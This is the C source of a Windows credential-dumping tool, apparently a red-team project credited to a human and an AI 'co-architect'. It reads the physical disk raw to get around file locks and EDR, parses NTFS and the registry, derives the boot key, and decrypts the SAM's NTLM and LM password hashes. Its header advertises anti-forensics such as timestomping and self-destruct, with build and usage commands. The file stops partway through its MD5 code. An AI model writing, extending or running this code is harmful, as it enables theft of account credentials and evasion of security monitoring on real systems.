/*
 * ============================================================================
 *  Sam The Butcher — Raw Disk Credential Extractor
 * ============================================================================
 *
 *  A standalone, single-file Windows credential extraction tool that operates
 *  below the filesystem layer via raw disk access. Bypasses file locks,
 *  EDR minifilters, and standard access controls by reading NTFS structures
 *  directly from \\.\PhysicalDrive0.
 *
 *  Capabilities:
 *    • Extract SAM, SYSTEM, SECURITY hives from locked files
 *    • Inline NTLM/LM hash decryption (no intermediate files)
 *    • Memory-only operation (--memory)
 *    • MFT, pagefile.sys, and hiberfil.sys extraction
 *    • VSS (Volume Shadow Copy) fallback
 *    • Stream XOR encryption of output (--key)
 *    • Self-destruct / memory burn (--burn)
 *    • Timestomp anti-forensics
 *
 *  Compile (MinGW-w64 cross or native):
 *    x86_64-w64-mingw32-gcc -O2 -s -static -o stb.exe sam_the_butcher.c
 *
 *  Usage:
 *    stb.exe --hashes --memory              # Hashes to stdout, zero disk traces
 *    stb.exe --hives --mft --key SECRET     # Dump encrypted hives + MFT
 *    stb.exe --hashes --hives --mft --pagefile --hiberfil --burn
 *
 * ============================================================================
 *  Authors
 * ============================================================================
 *
 *  KL3FT3Z — gitlab.com/toxy4ny
 *    Concept, redteam research, operational design, field testing
 *
 *  EVA — AI partner & co-architect
 *    NTFS parser architecture, registry crypto engine, code synthesis
 *
 *  This tool was forged in partnership between human ingenuity and
 *  machine precision. Use it ethically, use it wisely.
 *
 * ============================================================================
 */

#define _WIN32_WINNT 0x0600
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <wchar.h>
#include <time.h>

/* ==================== CONFIG ==================== */
#define TOOL_NAME           "Sam The Butcher"
#define TOOL_VERSION        "1.0.0"
#define MAX_PARTITIONS      32
#define MAX_MFT_ENTRIES     4000000
#define MFT_SCAN_CHUNK      65536

/* ==================== NTFS STRUCTURES ==================== */
#pragma pack(push, 1)

typedef struct {
    uint8_t  jump[3];
    uint8_t  oem_id[8];
    uint16_t bytes_per_sector;
    uint8_t  sectors_per_cluster;
    uint16_t reserved_sectors;
    uint8_t  always0_1[3];
    uint16_t unused0;
    uint8_t  always0_2[4];
    uint32_t unused1;
    uint64_t total_sectors;
    uint64_t mft_lcn;
    uint64_t mft2_lcn;
    int8_t   clusters_per_mft_record;
    uint8_t  unused2[3];
    int8_t   clusters_per_index_record;
    uint8_t  unused3[3];
    uint64_t serial_number;
    uint32_t checksum;
} NTFS_BOOT_SECTOR;

typedef struct {
    uint32_t signature;      /* "FILE" = 0x454C4946 */
    uint16_t usa_offset;
    uint16_t usa_count;
    uint64_t lsn;
    uint16_t sequence_number;
    uint16_t hardlink_count;
    uint16_t attr_offset;
    uint16_t flags;          /* 0x01 = in use, 0x02 = directory */
    uint32_t used_size;
    uint32_t alloc_size;
    uint64_t base_record;
    uint16_t next_attr_id;
    uint16_t usa;
    uint32_t usa_number;
} MFT_RECORD_HEADER;

typedef struct {
    uint32_t type;
    uint32_t length;
    uint8_t  non_resident;
    uint8_t  name_length;
    uint16_t name_offset;
    uint16_t flags;
    uint16_t attr_id;
} ATTR_HEADER_COMMON;

typedef struct {
    uint32_t content_length;
    uint16_t content_offset;
    uint16_t flags;
} ATTR_HEADER_RESIDENT;

typedef struct {
    uint64_t start_vcn;
    uint64_t end_vcn;
    uint16_t run_offset;
    uint16_t compression_unit;
    uint32_t padding;
    uint64_t alloc_size;
    uint64_t real_size;
    uint64_t init_size;
} ATTR_HEADER_NONRESIDENT;

typedef struct {
    uint64_t parent_ref;
    uint64_t creation_time;
    uint64_t mod_time;
    uint64_t mft_mod_time;
    uint64_t access_time;
    uint64_t alloc_size;
    uint64_t real_size;
    uint32_t flags;
    uint32_t reparse;
    uint8_t  name_length;
    uint8_t  name_namespace;
    wchar_t  name[1];
} FILE_NAME_ATTR;

#pragma pack(pop)

/* ==================== GLOBALS ==================== */
static HANDLE g_hDisk = INVALID_HANDLE_VALUE;
static uint64_t g_partitionOffset = 0;
static uint32_t g_bytesPerSector = 512;
static uint32_t g_sectorsPerCluster = 8;
static uint32_t g_clusterSize = 4096;
static uint64_t g_mftOffset = 0;
static uint32_t g_mftRecordSize = 1024;
static uint64_t g_mftRecordCount = 0;

static BYTE *g_mftBuffer = NULL;
static uint64_t g_mftBufferSize = 0;

typedef struct {
    uint64_t recordNumber;
    uint64_t parentRecord;
    wchar_t  name[256];
    int      isDirectory;
    int      inUse;
} MFT_ENTRY;

static MFT_ENTRY *g_entries = NULL;
static int g_entryCount = 0;
static int g_entryCapacity = 0;

/* ==================== FORWARD DECLS ==================== */
static void PrintBanner(void);
static BOOL OpenPhysicalDrive(int num);
static BOOL TryVSS(void);
static BOOL FindNtfsPartition(void);
static BOOL ReadBootSector(void);
static BOOL ReadMftIntoMemory(void);
static void BuildFileTree(void);
static BOOL ResolvePath(const wchar_t *path, uint64_t *outRecord);
static BOOL ExtractFileByRecord(uint64_t recordNum, BYTE **outBuf, DWORD *outSize);
static void XorCrypt(BYTE *data, DWORD len, const char *key);
static void TimestompFile(const wchar_t *path);
static void SelfDestruct(void);

/* Registry */
typedef struct { BYTE *data; DWORD size; } HIVE;
#define CELL_PTR(hive, off) ((hive)->data + 0x1000 + (off) + 4)
#define CELL_SIZE(hive, off) (*(int32_t*)((hive)->data + 0x1000 + (off)))

static int32_t HiveFindKey(HIVE *hive, int32_t parentOff, const wchar_t *path);
static int32_t HiveFindSubkey(HIVE *hive, int32_t listOff, const wchar_t *name);
static int32_t HiveFindSubkeyInParent(HIVE *hive, int32_t parentOff, const wchar_t *name);
static BOOL HiveGetValue(HIVE *hive, int32_t keyOff, const wchar_t *valName, BYTE **data, DWORD *dsize);
static void HiveEnumSubkeys(HIVE *hive, int32_t listOff, void (*cb)(int32_t, void *), void *ctx);
static BOOL ExtractBootKey(HIVE *systemHive, BYTE *bootKey);
static BOOL ExtractSamUsers(HIVE *samHive, HIVE *systemHive);

/* Crypto */
static void MD5(const BYTE *data, size_t len, BYTE *out);
static void RC4(const BYTE *key, size_t klen, BYTE *data, size_t dlen);

/* ==================== BANNER ==================== */
static void PrintBanner(void) {
    wprintf(L"\n");
    wprintf(L"   _____                  __  __            __   \n");
    wprintf(L"  / ___/____  ___  ____  / /_/ /_  ___     / /_  \n");
    wprintf(L"  \\__ \\/ __ \\/ _ \\/ __ \\/ __/ __ \\/ _ \\   / __/  \n");
    wprintf(L" ___/ / /_/ /  __/ / / / /_/ / / /  __/  / /_   \n");
    wprintf(L"/____/ .___/\\___/_/ /_/\\__/_/ /_/\\___/   \\__/   \n");
    wprintf(L"    /_/  Sam The Butcher — Raw Disk Credential Extractor\n");
    wprintf(L"         v" TOOL_VERSION L" | KL3FT3Z & EVA\n\n");
}

/* ==================== NTFS RAW DISK ==================== */
static BOOL OpenPhysicalDrive(int num) {
    wchar_t path[32];
    swprintf(path, 32, L"\\\\.\\PhysicalDrive%d", num);
    g_hDisk = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
                          NULL, OPEN_EXISTING, 0, NULL);
    return (g_hDisk != INVALID_HANDLE_VALUE);
}

static BOOL TryVSS(void) {
    for (int i = 1; i <= 20; i++) {
        wchar_t path[128];
        swprintf(path, 128, L"\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy%d", i);
        g_hDisk = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
                              NULL, OPEN_EXISTING, 0, NULL);
        if (g_hDisk != INVALID_HANDLE_VALUE) {
            if (FindNtfsPartition()) return TRUE;
            CloseHandle(g_hDisk);
            g_hDisk = INVALID_HANDLE_VALUE;
        }
    }
    return FALSE;
}

static BOOL FindNtfsPartition(void) {
    BYTE layoutBuf[sizeof(DRIVE_LAYOUT_INFORMATION_EX) + 32 * sizeof(PARTITION_INFORMATION_EX)];
    DWORD ret = 0;
    if (!DeviceIoControl(g_hDisk, IOCTL_DISK_GET_DRIVE_LAYOUT_EX,
                         NULL, 0, layoutBuf, sizeof(layoutBuf), &ret, NULL))
        return FALSE;

    DRIVE_LAYOUT_INFORMATION_EX *layout = (DRIVE_LAYOUT_INFORMATION_EX *)layoutBuf;
    for (DWORD i = 0; i < layout->PartitionCount; i++) {
        PARTITION_INFORMATION_EX *p = &layout->PartitionEntry[i];
        uint64_t off = p->StartingOffset.QuadPart;
        LARGE_INTEGER pos; pos.QuadPart = off;
        SetFilePointerEx(g_hDisk, pos, NULL, FILE_BEGIN);

        NTFS_BOOT_SECTOR boot;
        DWORD rd = 0;
        if (!ReadFile(g_hDisk, &boot, sizeof(boot), &rd, NULL) || rd != sizeof(boot))
            continue;
        if (memcmp(boot.oem_id, "NTFS    ", 8) == 0) {
            g_partitionOffset = off;
            g_bytesPerSector = boot.bytes_per_sector;
            g_sectorsPerCluster = boot.sectors_per_cluster;
            g_clusterSize = g_bytesPerSector * g_sectorsPerCluster;
            g_mftOffset = off + (boot.mft_lcn * g_clusterSize);

            if (boot.clusters_per_mft_record > 0)
                g_mftRecordSize = boot.clusters_per_mft_record * g_clusterSize;
            else
                g_mftRecordSize = 1U << (-boot.clusters_per_mft_record);

            return TRUE;
        }
    }
    return FALSE;
}

static BOOL ReadBootSector(void) {
    return (g_partitionOffset != 0);
}

/* ==================== DATA RUNS ==================== */
typedef struct {
    uint64_t offset;
    uint64_t length;
} DATA_RUN;

static BOOL DecodeDataRuns(BYTE *attr, DATA_RUN **runs, int *count) {
    ATTR_HEADER_NONRESIDENT *nh = (ATTR_HEADER_NONRESIDENT *)(attr + sizeof(ATTR_HEADER_COMMON));
    BYTE *p = attr + nh->run_offset;
    int cap = 16;
    *runs = malloc(cap * sizeof(DATA_RUN));
    *count = 0;
    int64_t prevOff = 0;

    while (*p != 0) {
        int lenSize = *p & 0x0F;
        int offSize = (*p >> 4) & 0x0F;
        p++;

        uint64_t length = 0;
        for (int i = 0; i < lenSize; i++) length |= ((uint64_t)p[i]) << (i*8);
        p += lenSize;

        int64_t offset = 0;
        if (offSize > 0) {
            for (int i = 0; i < offSize; i++) offset |= ((int64_t)p[i]) << (i*8);
            if (p[offSize-1] & 0x80)
                for (int i = offSize; i < 8; i++) offset |= (int64_t)0xFF << (i*8);
            p += offSize;
        }
        prevOff += offset;

        if (*count >= cap) {
            cap *= 2;
            *runs = realloc(*runs, cap * sizeof(DATA_RUN));
        }
        (*runs)[*count].length = length;
        (*runs)[*count].offset = (uint64_t)prevOff;
        (*count)++;
    }
    return TRUE;
}

/* ==================== MFT READING ==================== */
static BOOL ReadMftIntoMemory(void) {
    BYTE *mft0 = malloc(g_mftRecordSize);
    LARGE_INTEGER pos; pos.QuadPart = g_mftOffset;
    SetFilePointerEx(g_hDisk, pos, NULL, FILE_BEGIN);
    DWORD rd = 0;
    if (!ReadFile(g_hDisk, mft0, g_mftRecordSize, &rd, NULL) || rd != g_mftRecordSize) {
        free(mft0); return FALSE;
    }

    MFT_RECORD_HEADER *hdr = (MFT_RECORD_HEADER *)mft0;
    if (hdr->signature != 0x454C4946) { free(mft0); return FALSE; }

    BYTE *attr = mft0 + hdr->attr_offset;
    DATA_RUN *runs = NULL;
    int runCount = 0;
    uint64_t totalSize = 0;
    while (1) {
        ATTR_HEADER_COMMON *c = (ATTR_HEADER_COMMON *)attr;
        if (c->type == 0xFFFFFFFF) break;
        if (c->type == 0x80 && c->non_resident) {
            ATTR_HEADER_NONRESIDENT *nh = (ATTR_HEADER_NONRESIDENT *)(attr + sizeof(ATTR_HEADER_COMMON));
            totalSize = nh->alloc_size;
            DecodeDataRuns(attr, &runs, &runCount);
            break;
        }
        attr += c->length;
    }
    if (!runs) { free(mft0); return FALSE; }

    g_mftBufferSize = totalSize;
    g_mftBuffer = malloc((size_t)totalSize);
    if (!g_mftBuffer) { free(runs); free(mft0); return FALSE; }

    uint64_t done = 0;
    for (int i = 0; i < runCount; i++) {
        uint64_t fpos = g_partitionOffset + runs[i].offset * g_clusterSize;
        uint64_t flen = runs[i].length * g_clusterSize;
        if (done + flen > totalSize) flen = totalSize - done;

        pos.QuadPart = fpos;
        SetFilePointerEx(g_hDisk, pos, NULL, FILE_BEGIN);

        DWORD toRead = (DWORD)flen;
        DWORD got = 0;
        if (!ReadFile(g_hDisk, g_mftBuffer + done, toRead, &got, NULL)) {
            free(g_mftBuffer); g_mftBuffer = NULL;
            free(runs); free(mft0); return FALSE;
        }
        done += got;
    }

    g_mftRecordCount = totalSize / g_mftRecordSize;
    free(runs); free(mft0);
    return TRUE;
}

/* ==================== MFT TREE BUILDING ==================== */
static void BuildFileTree(void) {
    g_entryCapacity = 8192;
    g_entries = malloc(g_entryCapacity * sizeof(MFT_ENTRY));
    g_entryCount = 0;

    for (uint64_t r = 0; r < g_mftRecordCount && r < MAX_MFT_ENTRIES; r++) {
        BYTE *rec = g_mftBuffer + r * g_mftRecordSize;
        MFT_RECORD_HEADER *hdr = (MFT_RECORD_HEADER *)rec;
        if (hdr->signature != 0x454C4946) continue;
        if (!(hdr->flags & 0x01)) continue;

        WORD attrOff = hdr->attr_offset;
        BYTE *attr = rec + attrOff;

        wchar_t name[256] = {0};
        uint64_t parent = 0;
        int isDir = (hdr->flags & 0x02) ? 1 : 0;
        int gotName = 0;

        while (1) {
            ATTR_HEADER_COMMON *c = (ATTR_HEADER_COMMON *)attr;
            if (c->type == 0xFFFFFFFF) break;
            if (c->type == 0x30 && !c->non_resident) {
                ATTR_HEADER_RESIDENT *rh = (ATTR_HEADER_RESIDENT *)(attr + sizeof(ATTR_HEADER_COMMON));
                FILE_NAME_ATTR *fn = (FILE_NAME_ATTR *)(attr + rh->content_offset);
                if (!gotName || fn->name_namespace <= 1) {
                    parent = fn->parent_ref & 0xFFFFFFFFFFFFULL;
                    int nlen = fn->name_length;
                    if (nlen > 255) nlen = 255;
                    for (int j = 0; j < nlen; j++) name[j] = fn->name[j];
                    name[nlen] = 0;
                    gotName = 1;
                }
            }
            attr += c->length;
        }

        if (!gotName) continue;

        if (g_entryCount >= g_entryCapacity) {
            g_entryCapacity *= 2;
            g_entries = realloc(g_entries, g_entryCapacity * sizeof(MFT_ENTRY));
        }
        g_entries[g_entryCount].recordNumber = r;
        g_entries[g_entryCount].parentRecord = parent;
        wcscpy(g_entries[g_entryCount].name, name);
        g_entries[g_entryCount].isDirectory = isDir;
        g_entries[g_entryCount].inUse = 1;
        g_entryCount++;
    }
}

static int FindEntryByParentAndName(uint64_t parent, const wchar_t *name) {
    for (int i = 0; i < g_entryCount; i++) {
        if (g_entries[i].parentRecord == parent && _wcsicmp(g_entries[i].name, name) == 0)
            return i;
    }
    return -1;
}

static BOOL ResolvePath(const wchar_t *path, uint64_t *outRec) {
    uint64_t cur = 5;
    wchar_t buf[512];
    wcscpy(buf, path);
    wchar_t *ctx = NULL;
    wchar_t *tok = wcstok(buf, L"\\", &ctx);
    while (tok) {
        int idx = FindEntryByParentAndName(cur, tok);
        if (idx < 0) return FALSE;
        cur = g_entries[idx].recordNumber;
        tok = wcstok(NULL, L"\\", &ctx);
    }
    *outRec = cur;
    return TRUE;
}

/* ==================== FILE EXTRACTION ==================== */
static BOOL ExtractFileByRecord(uint64_t recordNum, BYTE **outBuf, DWORD *outSize) {
    BYTE *rec = g_mftBuffer + recordNum * g_mftRecordSize;
    MFT_RECORD_HEADER *hdr = (MFT_RECORD_HEADER *)rec;
    if (hdr->signature != 0x454C4946) return FALSE;

    BYTE *attr = rec + hdr->attr_offset;
    while (1) {
        ATTR_HEADER_COMMON *c = (ATTR_HEADER_COMMON *)attr;
        if (c->type == 0xFFFFFFFF) break;
        if (c->type == 0x80) {
            if (c->non_resident) {
                ATTR_HEADER_NONRESIDENT *nh = (ATTR_HEADER_NONRESIDENT *)(attr + sizeof(ATTR_HEADER_COMMON));
                uint64_t rsize = nh->real_size;
                *outBuf = malloc((size_t)rsize);
                *outSize = (DWORD)rsize;
                if (!*outBuf) return FALSE;

                DATA_RUN *runs = NULL;
                int rcnt = 0;
                DecodeDataRuns(attr, &runs, &rcnt);

                uint64_t done = 0;
                for (int i = 0; i < rcnt; i++) {
                    uint64_t fpos = g_partitionOffset + runs[i].offset * g_clusterSize;
                    uint64_t flen = runs[i].length * g_clusterSize;
                    if (done + flen > rsize) flen = rsize - done;

                    LARGE_INTEGER pos; pos.QuadPart = fpos;
                    SetFilePointerEx(g_hDisk, pos, NULL, FILE_BEGIN);
                    DWORD got = 0;
                    ReadFile(g_hDisk, *outBuf + done, (DWORD)flen, &got, NULL);
                    done += got;
                }
                free(runs);
                return TRUE;
            } else {
                ATTR_HEADER_RESIDENT *rh = (ATTR_HEADER_RESIDENT *)(attr + sizeof(ATTR_HEADER_COMMON));
                *outSize = rh->content_length;
                *outBuf = malloc(*outSize);
                memcpy(*outBuf, attr + rh->content_offset, *outSize);
                return TRUE;
            }
        }
        attr += c->length;
    }
    return FALSE;
}

/* ==================== REGISTRY PARSER ==================== */
static int32_t HiveFindSubkey(HIVE *hive, int32_t listOff, const wchar_t *name) {
    BYTE *list = CELL_PTR(hive, listOff);
    uint16_t sig = *(uint16_t*)list;
    uint16_t count = *(uint16_t*)(list + 2);

    if (sig == 0x696C) {
        for (int i = 0; i < count; i++) {
            int32_t nkOff = *(int32_t*)(list + 4 + i*4);
            BYTE *nk = CELL_PTR(hive, nkOff);
            uint16_t nlen = *(uint16_t*)(nk + 0x48);
            wchar_t *n = (wchar_t*)(nk + 0x4C);
            if (nlen/2 == wcslen(name)) {
                int ok = 1;
                for (int j = 0; j < (int)(nlen/2); j++)
                    if (towlower(n[j]) != towlower(name[j])) { ok = 0; break; }
                if (ok) return nkOff;
            }
        }
    } else if (sig == 0x666C || sig == 0x686C) {
        for (int i = 0; i < count; i++) {
            int32_t nkOff = *(int32_t*)(list + 4 + i*8 + 4);
            BYTE *nk = CELL_PTR(hive, nkOff);
            uint16_t nlen = *(uint16_t*)(nk + 0x48);
            wchar_t *n = (wchar_t*)(nk + 0x4C);
            if (nlen/2 == wcslen(name)) {
                int ok = 1;
                for (int j = 0; j < (int)(nlen/2); j++)
                    if (towlower(n[j]) != towlower(name[j])) { ok = 0; break; }
                if (ok) return nkOff;
            }
        }
    } else if (sig == 0x6972) {
        for (int i = 0; i < count; i++) {
            int32_t subList = *(int32_t*)(list + 4 + i*4);
            int32_t r = HiveFindSubkey(hive, subList, name);
            if (r >= 0) return r;
        }
    }
    return -1;
}

static int32_t HiveFindSubkeyInParent(HIVE *hive, int32_t parentOff, const wchar_t *name) {
    BYTE *nk = CELL_PTR(hive, parentOff);
    uint32_t numSub = *(uint32_t*)(nk + 0x14);
    if (numSub == 0) return -1;
    uint32_t listOff = *(uint32_t*)(nk + 0x1C);
    return HiveFindSubkey(hive, listOff, name);
}

static int32_t HiveFindKey(HIVE *hive, int32_t parentOff, const wchar_t *path) {
    if (parentOff < 0) {
        parentOff = *(int32_t*)(hive->data + 0x24);
    }
    wchar_t buf[512];
    wcscpy(buf, path);
    wchar_t *ctx = NULL;
    wchar_t *tok = wcstok(buf, L"\\", &ctx);
    while (tok) {
        parentOff = HiveFindSubkeyInParent(hive, parentOff, tok);
        if (parentOff < 0) return -1;
        tok = wcstok(NULL, L"\\", &ctx);
    }
    return parentOff;
}

static BOOL HiveGetValue(HIVE *hive, int32_t keyOff, const wchar_t *valName, BYTE **data, DWORD *dsize) {
    BYTE *nk = CELL_PTR(hive, keyOff);
    uint32_t numVals = *(uint32_t*)(nk + 0x24);
    if (numVals == 0) return FALSE;
    uint32_t listOff = *(uint32_t*)(nk + 0x28);
    BYTE *vlist = CELL_PTR(hive, listOff);

    for (uint32_t i = 0; i < numVals; i++) {
        int32_t vkOff = *(int32_t*)(vlist + i*4);
        BYTE *vk = CELL_PTR(hive, vkOff);
        if (*(uint16_t*)vk != 0x6B76) continue;
        uint16_t nameLen = *(uint16_t*)(vk + 2);
        uint32_t dataLen = *(uint32_t*)(vk + 4);
        uint32_t dataOff = *(uint32_t*)(vk + 8);
        wchar_t *vn = (wchar_t*)(vk + 0x14);

        int match = 0;
        if (nameLen == 0 && wcslen(valName) == 0) match = 1;
        else if (nameLen/2 == wcslen(valName)) {
            match = 1;
            for (int j = 0; j < (int)(nameLen/2); j++)
                if (towlower(vn[j]) != towlower(valName[j])) { match = 0; break; }
        }
        if (!match) continue;

        if (dataLen & 0x80000000) {
            *dsize = dataLen & 0x7FFFFFFF;
            *data = malloc(*dsize);
            memcpy(*data, vk + 8, *dsize > 4 ? 4 : *dsize);
        } else {
            *dsize = dataLen;
            *data = malloc(dataLen);
            memcpy(*data, CELL_PTR(hive, dataOff), dataLen);
        }
        return TRUE;
    }
    return FALSE;
}

static void HiveEnumSubkeys(HIVE *hive, int32_t listOff, void (*cb)(int32_t, void *), void *ctx) {
    BYTE *list = CELL_PTR(hive, listOff);
    uint16_t sig = *(uint16_t*)list;
    uint16_t count = *(uint16_t*)(list + 2);
    if (sig == 0x696C) {
        for (int i = 0; i < count; i++) cb(*(int32_t*)(list + 4 + i*4), ctx);
    } else if (sig == 0x666C || sig == 0x686C) {
        for (int i = 0; i < count; i++) cb(*(int32_t*)(list + 4 + i*8 + 4), ctx);
    } else if (sig == 0x6972) {
        for (int i = 0; i < count; i++)
            HiveEnumSubkeys(hive, *(int32_t*)(list + 4 + i*4), cb, ctx);
    }
}

/* ==================== BOOT KEY & SAM ==================== */
static BOOL ExtractBootKey(HIVE *systemHive, BYTE *bootKey) {
    int32_t lsa = HiveFindKey(systemHive, -1, L"ControlSet001\\Control\\Lsa");
    if (lsa < 0) lsa = HiveFindKey(systemHive, -1, L"CurrentControlSet\\Control\\Lsa");
    if (lsa < 0) return FALSE;

    const wchar_t *names[] = {L"JD", L"Skew1", L"GBG", L"Data"};
    char hexStr[64] = {0};
    int hpos = 0;

    for (int k = 0; k < 4; k++) {
        int32_t keyOff = HiveFindSubkeyInParent(systemHive, lsa, names[k]);
        if (keyOff < 0) return FALSE;
        BYTE *nk = CELL_PTR(systemHive, keyOff);
        uint32_t classOff = *(uint32_t*)(nk + 0x30);
        uint16_t classLen = *(uint16_t*)(nk + 0x4A);
        if (classLen == 0) return FALSE;
        BYTE *cls = CELL_PTR(systemHive, classOff);
        for (int i = 0; i < classLen; i += 2) {
            wchar_t wc = *(wchar_t*)(cls + i);
            if (wc >= L'0' && wc <= L'9') hexStr[hpos++] = (char)wc;
            else if (wc >= L'a' && wc <= L'f') hexStr[hpos++] = (char)wc;
            else if (wc >= L'A' && wc <= L'F') hexStr[hpos++] = (char)wc;
        }
    }
    if (hpos != 32) return FALSE;

    BYTE scrambled[16];
    for (int i = 0; i < 16; i++) {
        char b[3] = {hexStr[i*2], hexStr[i*2+1], 0};
        scrambled[i] = (BYTE)strtol(b, NULL, 16);
    }

    int p[] = {0x08,0x05,0x04,0x02,0x0B,0x09,0x0D,0x03,
               0x00,0x06,0x01,0x0C,0x0E,0x0A,0x0F,0x07};
    for (int i = 0; i < 16; i++) bootKey[i] = scrambled[p[i]];
    return TRUE;
}

static void DecryptHash(BYTE *bootKey, uint32_t rid, BYTE *enc, BYTE *out, const char *salt, int saltLen) {
    BYTE md5in[32];
    memcpy(md5in, bootKey, 16);
    memcpy(md5in+16, &rid, 4);
    memcpy(md5in+20, salt, saltLen);
    BYTE rc4key[16];
    MD5(md5in, 20 + saltLen, rc4key);
    memcpy(out, enc, 16);
    RC4(rc4key, 16, out, 16);
}

typedef struct {
    uint32_t rid;
    wchar_t username[64];
    BYTE lmHash[16];
    BYTE ntHash[16];
    int hasLm;
    int hasNt;
} SAM_USER;

typedef struct {
    SAM_USER *users;
    int count;
    int cap;
    HIVE *sam;
    HIVE *sys;
    BYTE bootKey[16];
} ENUM_CTX;

static void SamEnumCb(int32_t nkOff, void *vctx) {
    ENUM_CTX *ctx = vctx;
    BYTE *nk = CELL_PTR(ctx->sam, nkOff);
    uint16_t nlen = *(uint16_t*)(nk + 0x48);
    wchar_t *name = (wchar_t*)(nk + 0x4C);

    if (nlen != 16) return;
    char ridStr[16] = {0};
    for (int i = 0; i < 8; i++) ridStr[i] = (char)name[i];
    uint32_t rid = (uint32_t)strtoul(ridStr, NULL, 16);

    BYTE *vData = NULL; DWORD vSize = 0;
    if (!HiveGetValue(ctx->sam, nkOff, L"V", &vData, &vSize)) return;
    if (vSize < 0xCC) { free(vData); return; }

    uint32_t numVals = *(uint32_t*)vData;
    if (numVals < 4) { free(vData); return; }

    uint32_t nameOff  = *(uint32_t*)(vData + 4 + 1*12);
    uint32_t nameSize = *(uint32_t*)(vData + 4 + 1*12 + 4);
    uint32_t lmOff    = *(uint32_t*)(vData + 4 + 2*12);
    uint32_t lmSize   = *(uint32_t*)(vData + 4 + 2*12 + 4);
    uint32_t ntOff    = *(uint32_t*)(vData + 4 + 3*12);
    uint32_t ntSize   = *(uint32_t*)(vData + 4 + 3*12 + 4);

    if (ctx->count >= ctx->cap) {
        ctx->cap *= 2;
        ctx->users = realloc(ctx->users, ctx->cap * sizeof(SAM_USER));
    }
    SAM_USER *u = &ctx->users[ctx->count];
    memset(u, 0, sizeof(SAM_USER));
    u->rid = rid;
    u->hasLm = (lmSize == 16);
    u->hasNt = (ntSize == 16);

    if (nameSize > 0 && nameSize < 128) {
        wchar_t *un = (wchar_t*)(vData + 0xCC + nameOff);
        int ulen = nameSize / 2;
        if (ulen > 63) ulen = 63;
        for (int i = 0; i < ulen; i++) u->username[i] = un[i];
    }

    if (u->hasLm) {
        BYTE enc[16];
        memcpy(enc, vData + 0xCC + lmOff, 16);
        DecryptHash(ctx->bootKey, rid, enc, u->lmHash, "LMPASSWORD\0", 12);
    }
    if (u->hasNt) {
        BYTE enc[16];
        memcpy(enc, vData + 0xCC + ntOff, 16);
        DecryptHash(ctx->bootKey, rid, enc, u->ntHash, "NTPASSWORD\0", 12);
    }

    ctx->count++;
    free(vData);
}

static BOOL ExtractSamUsers(HIVE *samHive, HIVE *systemHive) {
    BYTE bootKey[16];
    if (!ExtractBootKey(systemHive, bootKey)) return FALSE;

    int32_t usersKey = HiveFindKey(samHive, -1, L"SAM\\Domains\\Account\\Users");
    if (usersKey < 0) return FALSE;

    BYTE *nk = CELL_PTR(samHive, usersKey);
    uint32_t numSub = *(uint32_t*)(nk + 0x14);
    if (numSub == 0) return FALSE;
    uint32_t listOff = *(uint32_t*)(nk + 0x1C);

    ENUM_CTX ctx = {0};
    ctx.cap = 16;
    ctx.users = malloc(ctx.cap * sizeof(SAM_USER));
    ctx.sam = samHive;
    ctx.sys = systemHive;
    memcpy(ctx.bootKey, bootKey, 16);

    HiveEnumSubkeys(samHive, listOff, SamEnumCb, &ctx);

    wprintf(L"\n[+] SAM: %d user(s) found\n", ctx.count);
    for (int i = 0; i < ctx.count; i++) {
        SAM_USER *u = &ctx.users[i];
        wprintf(L"\n  RID: 0x%08X | User: %s\n", u->rid, u->username);
        if (u->hasNt) {
            wprintf(L"    NTLM: ");
            for (int j = 0; j < 16; j++) wprintf(L"%02X", u->ntHash[j]);
            wprintf(L"\n");
        }
        if (u->hasLm) {
            wprintf(L"    LM:   ");
            for (int j = 0; j < 16; j++) wprintf(L"%02X", u->lmHash[j]);
            wprintf(L"\n");
        }
    }

    free(ctx.users);
    return TRUE;
}

/* ==================== CRYPTO ==================== */
static void RC4(const BYTE *key, size_t klen, BYTE *data, size_t dlen) {
    BYTE S[256];
    for (int i = 0; i < 256; i++) S[i] = (BYTE)i;
    int j = 0;
    for (int i = 0; i < 256; i++) {
        j = (j + S[i] + key[i % klen]) & 0xFF;
        BYTE t = S[i]; S[i] = S[j]; S[j] = t;
    }
    int x = 0; j = 0;
    for (size_t i = 0; i < dlen; i++) {
        x = (x + 1) & 0xFF;
        j = (j + S[x]) & 0xFF;
        BYTE t = S[x]; S[x] = S[j]; S[j] = t;
        data[i] ^= S[(S[x] + S[j]) & 0xFF];
    }
}

/* MD5 implementation (RFC 1321) */
typedef struct { uint32_t state[4]; uint32_t count[2]; BYTE buffer[64]; } MD5_CTX;
static void MD5Transform(uint32_t state[4], const BYTE block[64]);
static void MD5Init(MD5_CTX *ctx) {
    ctx->count[0] = ctx->count[1] = 0;
    ctx->state[0] = 0x67452301;
    ctx->state[1] = 0xEFCDAB89;
    ctx->state[2] = 0x98BADCFE;
    ctx->state[3] = 0x10325476;
}
static void MD5Update(MD5_CTX *ctx, const BYTE *input, size_t len) {
    size_t i, index, partLen;
    index = (size_t)((ctx->count[0] >> 3) & 0x3F);
    if ((ctx->count[0] += (uint32_t)(len << 3)) < (len << 3)) ctx->count[1]++;
    ctx->count[1] += (uint32_t)(len >> 29);
    partLen = 64 - index;
    if (len >= partLen) {
        memcpy(&ctx->buffer[index], input, partLen);
        MD5Transform(ctx->state, ctx->buffer);
        for (i = partLen; i + 63 < len; i += 64) MD5Transform(ctx->state, &input[i]);
        index = 0;
    } else i = 0;
    memcpy(&ctx->buffer[index], &input[i], len - i);
}
static void MD5Final(BYTE digest[16], MD5_CTX *ctx) {
    BYTE bits[8], padding[64];
    size_t index, padLen;
    memcpy(bits, ctx->count, 8);
    index = (size_t)((ctx->count[0] >> 3) & 0x3F);
    padLen = (index < 56) ? (56 - index) : (120 - index);
    memset(padding, 0, 64); padding[0] = 0x80;
    MD5Update(ctx, padding, padLen);
    MD5Update(ctx, bits, 8);
    memcpy(digest, ctx->state, 16);
}
#define F(x,y,z) (((x) & (y)) | ((~x) & (z)))
#define G(x,y,z) (((x) & (z)) | ((y) & (~z)))
#define H(x,y,z) ((x) ^ (y) ^ (z))
#define I(x,y,z) ((y) ^ ((x) | (~z)))
#define ROTATE_LEFT(x,n) (((x) << (n)) | ((x) >> (32-(n))))
